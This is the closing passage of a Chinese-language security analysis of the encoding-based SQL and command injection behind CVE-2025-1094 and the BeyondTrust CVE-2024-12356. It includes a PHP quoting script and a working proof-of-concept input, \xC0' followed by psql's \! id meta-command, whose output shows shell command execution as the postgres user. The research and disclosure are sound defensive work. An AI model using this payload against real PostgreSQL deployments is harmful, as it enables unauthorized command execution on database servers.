创建`dbq`脚本（内部用户名/密码等信息用于连接`postgre-server`）。

```php
#!/bin/env php
<?php
## reads one line from stdin and quotes it for safe inclusion into a SQL statement
$v = fgets(STDIN);
$l = strlen($v);
if($l>0 && $v[$l-1] == "\n")
        $v=substr($v,0,$l-1);
$host = "localhost";
$dbname = "test";
$user = "postgres";
$password = "test";

//$conn = pg_connect("host=$host dbname=$dbname user=$user password=$password ");
$cn = pg_connect("host=$host dbname=$dbname user=$user password=$password client_encoding='GBK'");
echo "'".pg_escape_string($cn, $v)."'\n";
```

该脚本与前文`dbquote`逻辑基本一样，主要区别是这里增加了`client_encoding='GBK'`客户端编码。

执行`quoted=$(echo -e "hey\xC0'; \! id ## " | ./dbq); echo "select $quoted" |  sudo -u postgres psql -e`，其输出类似：

```bash
select 'hey�';
ERROR:  invalid byte sequence for encoding "UTF8": 0xc0 0x27
uid=131(postgres) gid=138(postgres) groups=138(postgres),114(ssl-cert)
```

从结果来看，出发了命令执行，也就是说`\xc0\x27`序列在`client_encoding='GBK' server_encoding=UTF8`下依旧可用。此外简单尝试了下，`BIG5`，`UHC`做为客户端编码，现象也是如此。

这部分内容和`PostgreSQL`安全团队反馈后，对方回复认为这里的问题算是一种使用上的错误（`a problem in how the escape functions are used, not a bug in how the escape functions work`），而不是`Bug`（因为`UTF8`等编码本身的检测是没有问题的）。所以，这个现象目前在最新版上还是存在的。

### 四、结语

本文分析了因编码问题引起的`CVE-2024-12356`和`CVE-2025-1094`，解释了产生`BeyondTrust`命令注入的核心编码问题。基于该编码问题的思想，笔者对比分析了`Mysql`的代码以及补丁修复后的`PostgreSQL`代码，并进行了一定的拓展分析。`Mysql`暂未发现问题，但`PostgreSQL`在特定"**使用错误**"场景下，依旧会存在类似`CVE-2025-1094`的问题。

### 五、参考链接


1. [CVE-2024-12356 | AttackerKB](https://attackerkb.com/topics/G5s8ZWAbYH/cve-2024-12356/rapid7-analysis)